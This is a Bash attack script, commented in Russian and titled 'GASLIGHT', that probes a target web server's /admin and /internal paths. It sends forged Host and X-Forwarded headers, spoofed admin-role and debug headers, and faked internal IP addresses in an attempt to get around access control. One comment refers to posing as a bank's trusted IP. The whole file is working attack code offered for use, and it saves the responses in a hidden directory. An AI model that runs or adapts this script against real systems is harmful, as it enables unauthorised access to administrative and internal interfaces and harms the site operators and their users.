#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
GAS_DIR="$HOME/.shadow_gaslight/$DOMAIN"
mkdir -p "$GAS_DIR"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   💡 GASLIGHT — Манипуляция реальностью сервера           ║"
echo "║   Заставляем сервер сомневаться в своей конфигурации       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Атака: заставляем сервер думать что он — это не он
echo "[GASLIGHT] 💡 Начинаю манипуляцию..."

# 1. Противоречивые заголовки (сервер не понимает кто он)
for i in 1 2 3; do
    curl -sk --max-time 3 \
        -H "Host: $DOMAIN" \
        -H "Host: localhost" \
        -H "X-Forwarded-Host: $DOMAIN" \
        -H "X-Forwarded-Host: 127.0.0.1" \
        -H "X-Forwarded-Proto: https" \
        -H "X-Forwarded-Proto: http" \
        -H "X-Forwarded-Port: 443" \
        -H "X-Forwarded-Port: 80" \
        "$TARGET/admin" -o /dev/null -w "  💡 Противоречие #$i: %{http_code}\n" 2>/dev/null &
done
wait

# 2. Заставляем сервер думать что он в разработке
echo ""
echo "[GASLIGHT] 💡 Внушаю: ты в dev-режиме..."
curl -sk --max-time 3 \
    -H "X-Environment: development" \
    -H "X-Debug: true" \
    -H "X-Dev-Mode: 1" \
    -H "X-Staging: true" \
    -H "X-Testing: enabled" \
    "$TARGET" -o "$GAS_DIR/dev_mode.html" -w "  Dev mode: %{http_code}\n" 2>/dev/null

# 3. Заставляем сервер думать что запрос от админа
echo "[GASLIGHT] 💡 Внушаю: я — администратор..."
curl -sk --max-time 3 \
    -H "X-User-Role: admin" \
    -H "X-Auth-User: admin" \
    -H "X-Admin: true" \
    -H "X-Role: administrator" \
    -H "X-Privilege: elevated" \
    -H "X-Is-Admin: 1" \
    "$TARGET/admin" -o "$GAS_DIR/admin_bypass.html" -w "  Admin bypass: %{http_code}\n" 2>/dev/null

# 4. Внушаем что запрос от доверенного IP банка
echo "[GASLIGHT] 💡 Внушаю: я — свой..."
TRUSTED_IPS=("10.0.0.1" "192.168.1.1" "172.16.0.1" "127.0.0.1" "::1")
for ip in "${TRUSTED_IPS[@]}"; do
    curl -sk --max-time 3 \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        -H "X-Trusted: true" \
        -H "X-Internal-Network: yes" \
        "$TARGET/internal" -o /dev/null -w "  $ip: %{http_code}\n" 2>/dev/null &
done
wait

echo ""
echo "[GASLIGHT] 💡 Сервер дезориентирован."
echo "[GASLIGHT] 💡 Он больше не уверен кто он и кто я."
echo "[GASLIGHT] 📁 $GAS_DIR/"
